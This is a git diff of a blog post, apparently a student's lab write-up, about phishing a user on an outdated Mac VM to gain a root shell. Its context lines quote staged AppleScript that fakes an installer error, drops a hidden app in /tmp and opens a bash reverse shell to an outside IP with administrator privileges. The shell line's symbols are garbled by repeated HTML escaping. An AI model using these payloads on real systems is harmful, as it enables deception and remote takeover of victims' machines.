@@ -1,13 +1,11 @@
 ---
-title: Phishing for shells on rotten apples
 date: 2017-08-21 00:00:00 +0000
 layout: post
 tags:
 - phishing
 - macos
+title: Phishing for shells on rotten apples
 ---
-
-
 ## Introduction
 
 A few weeks ago I was given peculiar class assignment. I had to “root a Mac”. User interaction allowed. We were given an outdated Virtual Machine with OS X Tiger 10.7.5 installed, so I thought I’d be pretty easy. I was proven wrong very quickly, while doing some basic research.
@@ -54,6 +52,7 @@ The attacker tricks the victim into downloading and executing malicious software
 The script opens a metasploit shell, "fails installation" showing some innocent error message and drops the root shell into a temporary folder, and runs it as a background process where it waits silently until System Preferences is executed by the user.
 
 ```
+
 --stage one
 tell application "HelpViewer"
 	quit
@@ -72,6 +71,7 @@ do shell script "open /tmp/root.app"
 When root.app gets executed it overlays a legitimate administrator app and asks for administrator privileges as if it was the app asking:
 
 ```
+
 -- stage 2
 do shell script "/bin/bash -i &amp;amp;amp;gt;&amp;amp;amp;amp; /dev/tcp/172.168.16.135/8080 0&amp;amp;amp;gt;&amp;amp;amp;amp;1 &amp;amp;amp;gt; /dev/null 2&amp;amp;amp;gt;&amp;amp;amp;amp;1 &amp;amp;amp;amp;" with administrator privileges
 delay 3
